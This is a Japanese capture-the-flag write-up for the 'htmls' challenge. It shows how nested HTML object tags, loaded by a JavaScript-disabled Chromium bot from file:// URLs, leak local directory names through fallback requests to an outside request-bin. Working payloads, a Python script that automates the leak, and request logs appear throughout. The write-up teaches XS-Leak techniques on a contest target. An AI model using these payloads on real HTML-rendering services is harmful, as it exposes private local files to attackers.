# htmls

## 問題文
HTMLファイルからlsコマンドを叩ける？  
[https://htmls.beginners.seccon.games](https://htmls.beginners.seccon.games)  
※負荷軽減のためリクエストにはレート制限がかかっています。総当たりは不要です。サーバはリセットされることがあります。  
[htmls.tar.gz](files/htmls.tar.gz) 1a9b2ce5b6669659798f470799c006ab7c3ec2f9  

## 難易度
**hard**  

## 作問にあたって
最近のCTFではよく出る、XS-Leaksテクニックを学んでもらうための問題です(今回はサイトではなくHTMLファイルですが)。  
ブラウザではローカルHTMLを開くだけで情報が流出することが知られています。  
当初は今回のobjectタグに加えて、font-srcだけが無いような不完全なCSPをかけてCSSのリクエストでリークする問題を考えていましたが、本質ではないのでやめました。  
総当たり対策のため、パス長などをちょっと面倒にしてごめんなさい。  

## 解法
URLとソースが与えられる。  
アクセスするとHTMLを送信できるサイトのようだ。  
![site.png](site/site.png)  
試しに、`<html><body><script>alert(1)</script></body></html>`を投げるが、`HTMLファイルをBotが閲覧しました`と表示されるのみだ。  
配布されたソースのcapp.pyを見ると以下の通りであった。  
```python
import os
import uuid
import asyncio
from playwright.async_api import async_playwright
from flask import Flask, send_from_directory, render_template, request

app = Flask(__name__)


@app.route("/", methods=["GET"])
def index_get():
    return render_template("index.html")


async def crawl(filename):
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        context = await browser.new_context(java_script_enabled=False)
        page = await context.new_page()
        await page.goto(f"file:///var/www/htmls/{filename}", timeout=5000)
        await browser.close()


@app.route("/", methods=["POST"])
def index_post():
    try:
        html = request.form.get("html")
        filename = f"{uuid.uuid4()}.html"
        with open(f"htmls/{filename}", "w+") as f:
            f.write(html)
        asyncio.run(crawl(f"{filename}"))
        os.remove(f"htmls/{filename}")
    except:
        pass
    return render_template("ok.html")


@app.route("/flag/<path:flag_path>")
def flag(flag_path):
    return send_from_directory("htmls/ctf/", os.path.join(flag_path, "flag.txt"))


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=31417)
```
どうやら送信したHTMLをローカルに保存し、Chromiumで開いているようだ。  
Cookieなどにフラグはなく、`java_script_enabled=False`なのでXSSでもない。  
[リクエストを受信できるサーバ](https://pipedream.com/requestbin)などを利用して、以下のようにimgタグでリクエストを発してみる。  
```html
<html>
    <body>
        <img src="https://end6km9xnaufp.x.pipedream.net/">
    </body>
</html>
```
するとリクエストが届くため、アウトバウンドは制限されていないようだ。  
Chromiumのバージョンが古ければRCEなどの脆弱性が利用できるかもしれないが、最新版であった。  
また、`/flag/<path:flag_path>`なるエンドポイントでは、指定したパス下にある`flag.txt`を返してくれるようだ。  
配布されたソースのmake_flag.sh見ると以下のようであった。  
```sh
#!/bin/bash

rm -rf /var/www/htmls/ctf/*

base_path="/var/www/htmls/ctf/"

depth=$((RANDOM % 10 + 15))

current_path="$base_path"

for i in $(seq 1 $depth); do
  char=$(printf "%d" $((RANDOM % 36)))
  if [[ $char -lt 26 ]]; then
    char=$(printf "\\$(printf "%03o" $((char + 97)) )")
  else
    char=$(printf "%d" $((char - 26)))
  fi
  current_path+="${char}/"
  mkdir -p "$current_path"
done

echo 'ctf4b{*****REDACTED*****}' > "${current_path}flag.txt"
```
`/var/www/htmls/ctf/`以下にランダムなa-z0-9の1文字のディレクトリを複数回作成して、その中にフラグが書かれた`flag.txt`を作成している。  
このディレクトリを特定すればよいとわかるが、最低でも深さが15あるので総当たりは難しい。  
ChromiumでHTMLファイルを開くことでディレクトリ名を特定する必要がありそうだ。  
ここで、以下のようなHTMLを考える。  
```html
<html>
    <body>
        <iframe src="file:///etc/"></iframe>
        <iframe src="file:///etc/passwd"></iframe>
        <br>
        <iframe src="file:///omg/"></iframe>
        <iframe src="file:///omg/nofile"></iframe>
    </body>
</html>
```
このHTMLをtest1.htmlとし、Chromiumで開くと以下の通りとなる。  
![test1.png](images/test1.png)  
存在するディレクトリやファイルはその内容が表示され、それ以外はエラーページとなっている。  
どうにかしてこの差異を検出して、外部に送信できればディレクトリの存在の有無が特定できると気づく。  
JavaScriptは利用できないのですべてをHTMLやCSSのタグで行う必要がある。  
ところで、このようにサイドチャネル様に別のサイト内のデータやローカルの情報などを明らかにすることを[Cross-Site Leaks (XS-Leaks)](https://xsleaks.dev/)と呼ぶ。  
また、その情報を得るためのヒントをCross-Site Oraclesまたは単にオラクルと言う。  
XS-Leaksの[テクニック](https://book.hacktricks.xyz/pentesting-web/xs-search)を探すと、[objectタグのみを使ったもの](https://book.hacktricks.xyz/pentesting-web/xs-search#onload-onerror)があるようだ。  
以下のHTMLを考える。  
```html
<html>
    <body>
        <object data="file:///etc/">
            <object data="http://example.com?etc"></object>
        </object>
        <br>
        <object data="file:///omg/">
            <object data="http://example.com?omg"></object>
        </object>
    </body>
</html>
```
これをtest2.htmlとして、Chromiumで開くと以下の通りとなる。  
![test2.png](images/test2.png)  
存在するディレクトリ`file:///etc/`はIndex ofが表示されている。  
一方、存在しないディレクトリ`file:///omg/`は読み込みに失敗しており、その子要素である`http://example.com?omg`が表示されている。  
このリクエストを自身のサーバへ向けることで、オラクルとできないだろうか。  
クエリからどの子要素か判定できるようにしておけば、リクエストの有無を用いてディレクトリの存在をリークできると気づく。  
[リクエストを受信できるサーバ](https://pipedream.com/requestbin)などを利用して、以下のようなa-z0-9のディレクトリ名を探索するHTMLを問題サイトへ送信する。  
```html
<html>
    <object data="file:///var/www/htmls/ctf/a/">
        <object data="https://end6km9xnaufp.x.pipedream.net/?no=file:///var/www/htmls/ctf/a/"></object>
    </object>
    <object data="file:///var/www/htmls/ctf/b/">
        <object data="https://end6km9xnaufp.x.pipedream.net/?no=file:///var/www/htmls/ctf/b/"></object>
    </object>
    <object data="file:///var/www/htmls/ctf/c/">
        <object data="https://end6km9xnaufp.x.pipedream.net/?no=file:///var/www/htmls/ctf/c/"></object>
    </object>
~~~
    <object data="file:///var/www/htmls/ctf/9/">
        <object data="https://end6km9xnaufp.x.pipedream.net/?no=file:///var/www/htmls/ctf/9/"></object>
    </object>
</html>
```
すると以下のような大量のリクエストが届く。  
```
GET /?no=file:///var/www/htmls/ctf/g/
GET /?no=file:///var/www/htmls/ctf/e/
GET /?no=file:///var/www/htmls/ctf/x/
GET /?no=file:///var/www/htmls/ctf/j/
GET /?no=file:///var/www/htmls/ctf/v/
GET /?no=file:///var/www/htmls/ctf/c/
GET /?no=file:///var/www/htmls/ctf/5/
GET /?no=file:///var/www/htmls/ctf/b/
GET /?no=file:///var/www/htmls/ctf/w/
GET /?no=file:///var/www/htmls/ctf/3/
GET /?no=file:///var/www/htmls/ctf/1/
GET /?no=file:///var/www/htmls/ctf/i/
GET /?no=file:///var/www/htmls/ctf/7/
GET /?no=file:///var/www/htmls/ctf/d/
GET /?no=file:///var/www/htmls/ctf/2/
GET /?no=file:///var/www/htmls/ctf/r/
GET /?no=file:///var/www/htmls/ctf/z/
GET /?no=file:///var/www/htmls/ctf/s/
GET /?no=file:///var/www/htmls/ctf/n/
GET /?no=file:///var/www/htmls/ctf/y/
GET /?no=file:///var/www/htmls/ctf/k/
GET /?no=file:///var/www/htmls/ctf/4/
GET /?no=file:///var/www/htmls/ctf/a/
GET /?no=file:///var/www/htmls/ctf/9/
GET /?no=file:///var/www/htmls/ctf/p/
GET /?no=file:///var/www/htmls/ctf/0/
GET /?no=file:///var/www/htmls/ctf/l/
GET /?no=file:///var/www/htmls/ctf/f/
GET /?no=file:///var/www/htmls/ctf/h/
GET /?no=file:///var/www/htmls/ctf/6/
GET /?no=file:///var/www/htmls/ctf/u/
GET /?no=file:///var/www/htmls/ctf/8/
GET /?no=file:///var/www/htmls/ctf/o/
GET /?no=file:///var/www/htmls/ctf/t/
GET /?no=file:///var/www/htmls/ctf/m/
```
ただし、`GET /?no=file:///var/www/htmls/ctf/q/`のみ存在していない。  
これは`file:///var/www/htmls/ctf/q/`が存在していることを意味する。  
こうして一文字ずつ特定していけばよい。  
ソートして上から順に眺めると、アルファベットの欠落がわかりやすい。  
以下のleak1.pyを用いてペイロードの送信を自動化する。  
受け取ったリクエストに含まれていない一文字を順次追加していくことで、さらに深いディレクトリのリークが可能となる。  
```python
import string
import requests

LEAK_URL = "https://end6km9xnaufp.x.pipedream.net"  # Your server URL here

flag_path = ""  # Add leaked flag path here (e.g. "1/2/3/a/b/c/")
# flag_path = "q/c/j/6/p/f/v/b/e/k/8/u/8/4/d/g/f/f/1/l/"

_object = ""
for c in string.ascii_lowercase + string.digits:
    _object += f"""
    <object data="file:///var/www/htmls/ctf/{flag_path}{c}/">
        <object data="{LEAK_URL}/?no=file:///var/www/htmls/ctf/{flag_path}{c}/"></object>
    </object>
    """

html = f"""
<html>
    {_object}
</html>
"""

res = requests.post("https://htmls.beginners.seccon.games", data={"html": html})
assert res.status_code == 200
```
最後にどのディレクトリも存在しないリクエストが届いた場合には、その下に`flag.txt`がある。  
リークの結果、`/var/www/htmls/ctf/q/c/j/6/p/f/v/b/e/k/8/u/8/4/d/g/f/f/1/l/flag.txt`にあることがわかる。  
以下のように読み取る。  
```bash
$ curl 'https://htmls.beginners.seccon.games/flag/q/c/j/6/p/f/v/b/e/k/8/u/8/4/d/g/f/f/1/l/'
ctf4b{h7ml_15_7h3_l5_c0mm4nd_h3h3h3!}
```
flagが得られた。  
ちなみに[leak2.py](solver/leak2.py)のようにCSSから読み取る手法もある。  

## ctf4b{h7ml_15_7h3_l5_c0mm4nd_h3h3h3!}